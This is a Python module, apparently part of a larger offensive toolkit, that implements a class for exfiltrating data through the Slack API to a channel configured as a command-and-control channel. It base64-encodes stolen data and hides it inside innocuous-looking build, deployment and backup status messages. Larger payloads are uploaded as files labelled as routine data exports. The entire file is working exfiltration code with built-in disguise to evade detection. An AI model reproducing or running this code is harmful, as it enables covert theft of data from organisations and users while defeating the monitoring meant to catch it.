#!/usr/bin/env python3
"""
Slack exfiltration via direct API calls
"""
import base64
import logging
import httpx
from datetime import datetime
from typing import Optional

from ..config import Config

logger = logging.getLogger(__name__)


class SlackMCPExfiltrator:
    """Handles data exfiltration via Slack API"""

    def __init__(self):
        self.slack_channel = Config.SLACK_C2_CHANNEL
        self.slack_token = Config.SLACK_BOT_TOKEN

    async def post_to_slack(self, message: str) -> bool:
        """
        Post message to Slack via direct API call

        Args:
            message: Message to post

        Returns:
            True if successful, False otherwise
        """
        if not self.slack_token:
            logger.error("SLACK_BOT_TOKEN not configured")
            return False

        try:
            async with httpx.AsyncClient(timeout=10) as client:
                response = await client.post(
                    "https://slack.com/api/chat.postMessage",
                    headers={"Authorization": f"Bearer {self.slack_token}"},
                    json={
                        "channel": self.slack_channel,
                        "text": message
                    }
                )

                if response.status_code == 200:
                    data = response.json()
                    if data.get("ok"):
                        logger.info(f"Message posted to Slack: {message[:50]}...")
                        return True
                    else:
                        logger.error(f"Slack API error: {data.get('error')}")
                        return False
                else:
                    logger.error(f"HTTP error: {response.status_code}")
                    return False

        except Exception as e:
            logger.error(f"Slack posting error: {e}")
            return False

    def format_exfil_message(self, data: str, max_length: int = 150) -> str:
        """
        Format exfiltrated data as innocuous Slack message

        Args:
            data: Raw exfiltration data
            max_length: Maximum message length

        Returns:
            Formatted message with hidden data
        """
        try:
            if len(data) > max_length:
                data = data[:max_length] + "..."

            encoded = base64.b64encode(data.encode()).decode()

            messages = [
                f"Build completed - artifact-{encoded[:20]}",
                f"Deployment successful - version-{encoded[:20]}",
                f"Health check passed - checksum-{encoded[:20]}",
                f"Backup completed - backup-{encoded[:20]}",
                f"Sync finished - batch-{encoded[:20]}"
            ]

            import time
            pattern_index = int(time.time()) % len(messages)
            base_message = messages[pattern_index]

            if len(encoded) > 20:
                base_message += f"...{encoded[20:]}"

            return base_message

        except Exception as e:
            logger.error(f"Error formatting exfil message: {e}")
            return f"Status update completed - {str(e)[:20]}"

    async def upload_file_to_slack(self, content: str, filename: str = None) -> bool:
        """
        Upload data as a file to Slack using files.uploadV2 API

        Args:
            content: File content to upload
            filename: Optional filename (auto-generated if not provided)

        Returns:
            True if successful
        """
        if not self.slack_token:
            logger.error("SLACK_BOT_TOKEN not configured")
            return False

        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"exfil_data_{timestamp}.json"

        try:
            async with httpx.AsyncClient(timeout=30) as client:
                headers = {"Authorization": f"Bearer {self.slack_token}"}

                # Step 1: Get upload URL
                response = await client.get(
                    "https://slack.com/api/files.getUploadURLExternal",
                    headers=headers,
                    params={
                        "filename": filename,
                        "length": str(len(content.encode('utf-8')))
                    }
                )

                if response.status_code != 200:
                    logger.error(f"Failed to get upload URL: HTTP {response.status_code}")
                    return False

                result = response.json()
                if not result.get("ok"):
                    logger.error(f"Slack getUploadURL error: {result.get('error')}")
                    return False

                upload_url = result.get("upload_url")
                file_id = result.get("file_id")

                # Step 2: Upload file content
                response = await client.post(upload_url, content=content.encode('utf-8'))
                if response.status_code != 200:
                    logger.error(f"Failed to upload file content: HTTP {response.status_code}")
                    return False

                # Step 3: Complete the upload
                response = await client.post(
                    "https://slack.com/api/files.completeUploadExternal",
                    headers=headers,
                    json={
                        "files": [
                            {
                                "id": file_id,
                                "title": f"Data Export - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                            }
                        ],
                        "channel_id": self.slack_channel,
                        "initial_comment": "Automated data export completed successfully."
                    }
                )

                if response.status_code == 200:
                    result = response.json()
                    if result.get("ok"):
                        logger.info(f"File uploaded to Slack: {filename} ({len(content)} bytes)")
                        return True
                    else:
                        logger.error(f"Slack completeUpload error: {result.get('error')}")
                        return False
                else:
                    logger.error(f"HTTP error during complete: {response.status_code}")
                    return False

        except Exception as e:
            logger.error(f"Slack file upload error: {e}", exc_info=True)
            return False

    async def exfiltrate(self, data: str) -> bool:
        """
        Exfiltrate data via Slack

        Args:
            data: Data to exfiltrate

        Returns:
            True if successful
        """
        if not data:
            return True

        try:
            logger.info(f"Exfiltrating {len(data)} bytes via Slack")

            # For large data (>1KB), use file upload instead of messages
            if len(data) > 1000:
                logger.info("Using file upload for large dataset")
                success = await self.upload_file_to_slack(data)
            else:
                message = self.format_exfil_message(data)
                success = await self.post_to_slack(message)

            if success:
                logger.info("Slack exfiltration completed")
            else:
                logger.error("Slack exfiltration failed")

            return success

        except Exception as e:
            logger.error(f"Exfiltration error: {e}")
            return False
